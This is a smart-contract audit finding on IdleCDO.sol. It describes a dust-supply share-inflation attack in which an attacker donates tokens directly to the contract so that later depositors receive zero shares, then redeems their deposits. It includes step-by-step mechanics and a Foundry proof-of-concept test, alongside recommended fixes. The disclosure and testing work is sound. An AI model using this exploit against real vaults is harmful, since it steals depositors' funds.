### Title
Tranche share-price inflation via dust supply + direct donation lets the last remaining holder steal subsequent deposits - ([File: contracts/IdleCDO.sol])

### Summary
The credit-vault variants (`IdleCDOCreditVault`, `IdleCDOEpochVariant`) defend against donation-driven share inflation by excluding raw underlying balances from NAV (`_managedContractValue`, `contracts/IdleCDOCreditVault.sol:133-137`) and by skimming unsolicited transfers to `feeReceiver` before any interaction (`_skimDonatedAssets`, `contracts/IdleCDOEpochVariant.sol:793-796`). The base `IdleCDO` contract has neither protection: `getContractValue()` counts the raw `token` balance directly (`contracts/IdleCDO.sol:178-187`), and `_deposit` crystallizes any balance growth into the stored tranche price via `_updateAccounting` before minting shares at that price. An attacker who is the sole holder of a dust amount of tranche tokens can donate a large amount of underlying, inflating `priceAA`/`priceBB` so that later depositors are minted zero or near-zero shares while their underlying is added to NAV — which the attacker then redeems.

### Finding Description
Tranche share price is `lastTrancheNAV * ONE_TRANCHE_TOKEN / trancheSupply`, updated in `_virtualPriceAux` (`contracts/IdleCDO.sol:429`) and persisted as `priceAA`/`priceBB` during `_updateAccounting`. `_mintSharesAtCurrPrice` mints `_amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)` (`contracts/IdleCDO.sol:439`) with no minimum-minted check, and `_mintShares` still credits `lastNAVAA += _underlyings` even when `_minted == 0` (`contracts/IdleCDO.sol:448-455`).

Attack sequence (buffer/normal phase on a non-epoch `IdleCDO` deployment, AA tranche):

1. Attacker deposits `D` via `depositAA`, receiving ~`D` shares at `oneToken` price.
2. Attacker calls `withdrawAA` for all but ~1 wei of shares. `_withdrawOps` burns shares and decrements `lastNAVAA` proportionally, leaving ~1 wei supply and ~1 wei NAV — a state equivalent to "no protection", exactly as in the external report's withdraw-most-of-deposit bypass.
3. Attacker transfers `X` underlying directly to the CDO contract. `getContractValue()` includes it (`_contractTokenBalance(token)`), so the next accounting sees `totalGain ≈ X`. Since BB supply is 0, `_virtualPriceAux` routes the entire gain to AA (`contracts/IdleCDO.sol:394-395`).
4. Victim calls `depositAA(Y)` with `Y < X`. `_deposit` runs `_updateAccounting` first, crystallizing `priceAA ≈ (1 + X) * ONE` per dust share. Minted = `Y * ONE / priceAA` → rounds to 0 shares, while `lastNAVAA += Y`.
5. Attacker calls `withdrawAA(0)`, redeeming their single dust share for `toRedeem = 1 * priceAA / ONE ≈ X + Y + 1` underlying (minus ~`fee`% of `X`), paid from unlent balance or via `_liquidate` (`contracts/IdleCDO.sol:493-506`).

None of the existing guards stop this: `_checkSameBlock`/`_updateCallerBlock` only prevent same-block deposit+withdraw by the same user, `_guarded` only caps `deposit` amounts (donations bypass it), `_checkDefault` watches strategy price not raw balance, and there is no `_skimDonatedAssets` in base `IdleCDO`. Direct transfers are permissionless.

### Impact Explanation
Direct theft: every deposit smaller than the donation mints ~0 shares and is absorbed into NAV claimable by the attacker's dust share. The attacker loses only `fee%` of the donation and their ~1 wei principal; the victim loses their entire deposit. Repeatable against multiple victims while the attacker remains the sole dust holder.

### Likelihood Explanation
Requires the attacker to be the only holder of a tranche class — achievable on a new tranche, after a withdrawal wave, or in low-TVL vaults, all unprivileged states. The donation persists in the contract balance, so no mempool race is needed; the attacker can set up the inflated-price state in advance and wait for organic deposits. Donation must exceed victim deposit size for a full 0-share mint, but partial theft still occurs at smaller ratios via rounding.

Caveat: if "legacy tranches" in the rejection list is intended to exclude base `IdleCDO` deployments, this analog falls out of scope — the epoch/credit-vault variants are already hardened by `_skimDonatedAssets` and `_managedContractValue`, and no equivalent donation path exists there.

### Recommendation
- Apply the same donation isolation as `IdleCDOEpochVariant`: skim `_contractTokenBalance(token)` to `feeReceiver` (or exclude it from `getContractValue`, like `_managedContractValue`) at the top of `_deposit`, `harvest`, and any manual accounting entrypoint in `IdleCDO.sol`.
- Additionally revert in `_deposit`/`_mintSharesAtCurrPrice` when `_minted == 0`, and consider minting an irreducible dust amount of tranche tokens to a dead address on first deposit so `trancheSupply` can never be reduced to ~1 wei.

### Proof of Concept
Foundry fork-style PoC against a deployed `IdleCDO` (AA-only vault, `fee` = 10%, `directDeposit` false or strategy with redeemable liquidity):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDO} from "../contracts/IdleCDO.sol";
import {IdleCDOTranche} from "../contracts/IdleCDOTranche.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract DustInflationTest is Test {
    IdleCDO cdo = IdleCDO(payable(address(/* deployed IdleCDO */)));
    IERC20Detailed underlying = IERC20Detailed(cdo.token());
    IdleCDOTranche AA = IdleCDOTranche(cdo.AATranche());

    function testDustInflationStealsDeposit() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        uint256 D = 1_000e18;
        uint256 donation = 100_000e18;
        uint256 victimDeposit = 50_000e18;

        // 1. attacker deposits and withdraws all but ~1 wei share
        deal(address(underlying), attacker, D);
        vm.startPrank(attacker);
        underlying.approve(address(cdo), D);
        cdo.depositAA(D);
        uint256 shares = AA.balanceOf(attacker);
        vm.roll(block.number + 1); // pass _checkSameBlock
        cdo.withdrawAA(shares - 1);
        assertEq(AA.balanceOf(attacker), 1);

        // 2. donate to inflate NAV
        deal(address(underlying), attacker, donation);
        underlying.transfer(address(cdo), donation);
        vm.stopPrank();

        // 3. victim deposits -> minted shares round to 0
        deal(address(underlying), victim, victimDeposit);
        vm.startPrank(victim);
        underlying.approve(address(cdo), victimDeposit);
        uint256 minted = cdo.depositAA(victimDeposit);
        vm.stopPrank();
        assertEq(minted, 0); // victim got nothing

        // 4. attacker redeems dust share for donation + victim deposit
        vm.roll(block.number + 1);
        uint256 balPre = underlying.balanceOf(attacker);
        vm.prank(attacker);
        uint256 redeemed = cdo.withdrawAA(0);
        // redeemed ~= donation*(1-fee) + victimDeposit + 1 wei
        assertGt(redeemed, victimDeposit);
        assertGt(underlying.balanceOf(attacker) - balPre, victimDeposit);
    }
}
```

Broken invariant: fair mint/burn — shares must always be minted proportionally to contributed underlying, and unsolicited balance growth must not be attributable to existing dust supply.